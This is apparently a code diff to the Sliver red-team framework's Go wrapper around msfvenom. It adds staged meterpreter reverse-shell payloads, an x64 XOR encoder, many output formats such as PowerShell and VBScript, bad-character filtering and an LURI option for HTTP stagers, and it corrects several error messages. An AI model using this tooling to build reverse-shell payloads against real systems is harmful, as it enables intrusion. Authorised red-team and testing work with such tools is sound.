@@ -4,9 +4,10 @@ import (
 	"bytes"
 	"fmt"
 	"os/exec"
-	"github.com/bishopfox/sliver/server/log"
 	"strconv"
 	"strings"
+
+	"github.com/bishopfox/sliver/server/log"
 )
 
 const (
@@ -28,6 +29,7 @@ var (
 	ValidEncoders = map[string]bool{
 		"":                   true,
 		"x86/shikata_ga_nai": true,
+		"x64/xor_dynamic":    true,
 	}
 
 	// ValidPayloads - Valid payloads and OS combos
@@ -36,6 +38,9 @@ var (
 			"meterpreter_reverse_http":  true,
 			"meterpreter_reverse_https": true,
 			"meterpreter_reverse_tcp":   true,
+			"meterpreter/reverse_tcp":   true,
+			"meterpreter/reverse_http":  true,
+			"meterpreter/reverse_https": true,
 		},
 		"linux": map[string]bool{
 			"meterpreter_reverse_http":  true,
@@ -48,6 +53,31 @@ var (
 			"meterpreter_reverse_tcp":   true,
 		},
 	}
+
+	ValidFormats = map[string]bool{
+		"bash":          true,
+		"c":             true,
+		"csharp":        true,
+		"dw":            true,
+		"dword":         true,
+		"hex":           true,
+		"java":          true,
+		"js_be":         true,
+		"js_le":         true,
+		"num":           true,
+		"perl":          true,
+		"pl":            true,
+		"powershell":    true,
+		"ps1":           true,
+		"py":            true,
+		"python":        true,
+		"raw":           true,
+		"rb":            true,
+		"ruby":          true,
+		"sh":            true,
+		"vbapplication": true,
+		"vbscript":      true,
+	}
 )
 
 // VenomConfig -
@@ -59,6 +89,9 @@ type VenomConfig struct {
 	Iterations int
 	LHost      string
 	LPort      uint16
+	BadChars   []string
+	Format     string
+	Luri       string
 }
 
 // Version - Return the version of MSFVenom
@@ -76,15 +109,19 @@ func VenomPayload(config VenomConfig) ([]byte, error) {
 	}
 	// Arch
 	if _, ok := ValidArches[config.Arch]; !ok {
-		return nil, fmt.Errorf(fmt.Sprintf("Invalid arch: %s", config.Os))
+		return nil, fmt.Errorf(fmt.Sprintf("Invalid arch: %s", config.Arch))
 	}
 	// Payload
 	if _, ok := ValidPayloads[config.Os][config.Payload]; !ok {
-		return nil, fmt.Errorf(fmt.Sprintf("Invalid payload: %s", config.Os))
+		return nil, fmt.Errorf(fmt.Sprintf("Invalid payload: %s", config.Payload))
 	}
 	// Encoder
 	if _, ok := ValidEncoders[config.Encoder]; !ok {
-		return nil, fmt.Errorf(fmt.Sprintf("Invalid encoder: %s", config.Os))
+		return nil, fmt.Errorf(fmt.Sprintf("Invalid encoder: %s", config.Encoder))
+	}
+	// Check format
+	if _, ok := ValidFormats[config.Format]; !ok {
+		return nil, fmt.Errorf(fmt.Sprintf("Invalid format: %s", config.Format))
 	}
 
 	target := config.Os
@@ -92,14 +129,34 @@ func VenomPayload(config VenomConfig) ([]byte, error) {
 		target = strings.Join([]string{config.Os, config.Arch}, sep)
 	}
 	payload := strings.Join([]string{target, config.Payload}, sep)
+
+	// LURI handling for HTTP stager
+	luri := config.Luri
+	if luri != "" {
+		luri = fmt.Sprintf("LURI=%s", luri)
+	}
+
 	args := []string{
 		"--platform", config.Os,
 		"--arch", config.Arch,
-		"--format", "raw",
+		"--format", config.Format,
 		"--payload", payload,
 		fmt.Sprintf("LHOST=%s", config.LHost),
 		fmt.Sprintf("LPORT=%d", config.LPort),
 		fmt.Sprintf("EXITFUNC=thread"),
+	}
+
+	if luri != "" {
+		args = append(args, luri)
+	}
+	// Check badchars for stager
+	if len(config.BadChars) > 0 {
+		for _, b := range config.BadChars {
+			// using -b instead of --bad-chars
+			// as it made msfvenom crash on my machine
+			badChars := fmt.Sprintf("-b %s", b)
+			args = append(args, badChars)
+		}
 	}
 
 	if config.Encoder != "" && config.Encoder != "none" {
